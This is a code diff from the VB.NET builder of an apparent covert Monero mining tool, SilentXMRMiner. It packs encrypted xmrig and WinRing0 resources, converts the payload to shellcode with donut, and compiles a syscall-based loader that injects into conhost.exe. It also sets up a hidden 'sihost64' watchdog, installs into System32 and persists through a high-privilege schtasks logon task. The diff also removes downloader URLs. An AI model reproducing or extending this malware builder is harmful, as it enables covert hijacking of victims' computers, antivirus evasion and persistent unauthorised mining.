@@ -52,14 +52,12 @@ Public Class Codedom
             F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
-                If Not F.FA.toggleDownloader.Checked Then
-                    R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
-                End If
+                R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
                 R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                 If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                     R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
                 End If
-                If F.toggleEnableGPU.Checked And Not F.FA.toggleDownloader.Checked Then
+                If F.toggleEnableGPU.Checked Then
                     R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                 End If
                 R.Generate()
@@ -139,6 +137,7 @@ Public Class Codedom
             Dim filename = Path.GetFileNameWithoutExtension(SavePath)
             Dim paths As Dictionary(Of String, String) = New Dictionary(Of String, String)() From {
                     {"current", currentDirectory},
+                    {"includes", Path.Combine(currentDirectory, "Includes")},
                     {"compilers", Path.Combine(currentDirectory, "Compilers")},
                     {"compilerslog", Path.Combine(currentDirectory, "Compilers\logs")},
                     {"windres", Path.Combine(currentDirectory, "Compilers\MinGW64\bin\windres.exe")},
@@ -160,6 +159,12 @@ Public Class Codedom
             If Not Directory.Exists(paths("compilers")) Then
                 Using archive As ZipArchive = New ZipArchive(New MemoryStream(My.Resources.Compilers))
                     archive.ExtractToDirectory(paths("compilers"))
+                End Using
+            End If
+
+            If Not Directory.Exists(paths("includes")) Then
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(My.Resources.Includes))
+                    archive.ExtractToDirectory(paths("includes"))
                 End Using
             End If
 
@@ -200,20 +205,23 @@ Public Class Codedom
                 If F.BuildErrorTest(Not File.Exists(paths("resource.o")), String.Format("Error: Failed at compiling resources, check the error log at {0}.", paths("windreslog"))) Then Return
             End If
 
-            F.RunExternalProgram(paths("donut"), String.Format("""{0}"" -a 2 -f 1", InputFile), currentDirectory, paths("tcclog"))
+            F.RunExternalProgram(paths("donut"), String.Format("""{0}"" -a 2 -f 1", InputFile), currentDirectory, paths("donutlog"))
             Dim shellcodebytes As String = File.ReadAllText(paths("loader"), Encoding.GetEncoding("ISO-8859-1"))
             Dim shellcode As String = F.ToLiteral(F.Cipher(shellcodebytes, F.Key))
 
+            sb.Replace("#KEYLENGTH", F.Key.Length)
             sb.Replace("#KEY", F.Key)
             sb.Replace("#DELAY", F.txtStartDelay.Text)
             sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length)
             sb.Replace("#SHELLCODE", shellcode)
             sb.Replace("#ARGS", Args)
             F.CipherReplace(sb, "#ENV", "SystemRoot")
-            F.CipherReplace(sb, "#TARGET", "System32\\conhost.exe")
+            F.CipherReplace(sb, "#TARGET", "System32\conhost.exe")
+            F.CipherReplace(sb, "#FORMAT1", "%s\%s")
+            F.CipherReplace(sb, "#FORMAT2", """%s"" ""%s""")
 
             File.WriteAllText(paths("filename") & ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"))
-            F.RunExternalProgram(paths("tcc"), String.Format("-Wall -Wl,-subsystem=windows ""{0}"" {1} -lntdll", paths("filename") & ".c", If(buildResource, "resource.o", "")), currentDirectory, paths("tcclog"))
+            F.RunExternalProgram(paths("tcc"), String.Format("-Wl,-subsystem=windows ""{0}"" {1} ""{2}"" -xa ""{3}"" ", filename & ".c", If(buildResource, "resource.o", ""), Path.Combine(currentDirectory, "Includes\syscalls.c"), Path.Combine(currentDirectory, "Includes\syscallsstubs.asm")), currentDirectory, paths("tcclog"))
             File.Delete(paths("resource.o"))
             File.Delete(paths("filename") & ".c")
             File.Delete(paths("loader"))
@@ -281,10 +289,6 @@ Public Class Codedom
             stringb.Replace("DefDebug", "true")
         End If
 
-        If F.FA.toggleDownloader.Checked Then
-            stringb.Replace("DefDownloader", "true")
-        End If
-
         If F.toggleEnableGPU.Checked Then
             stringb.Replace("DefGPU", "true")
         End If
@@ -311,9 +315,9 @@ Public Class Codedom
 
             If F.FA.toggleInstallSystem32.Checked Then
                 stringb.Replace("DefSystem32", "true")
-                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), _rGetString_(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))")
             Else
-                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", _rGetString_(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))")
             End If
 
             If F.toggleWatchdog.Checked Then
@@ -338,10 +342,6 @@ Public Class Codedom
         stringb.Replace("#KEY", F.AESKEY)
         stringb.Replace("#SALT", F.SALT)
         stringb.Replace("#IV", F.IV)
-        stringb.Replace("#SANCTAMLIBSURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=libs"))
-        stringb.Replace("#SANCTAMMINERURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=xmrig"))
-        stringb.Replace("#LIBSURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/libs.zip"))
-        stringb.Replace("#MINERURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/xmrig.zip"))
         stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
         stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
         stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + """ /tr ""{0}"""))
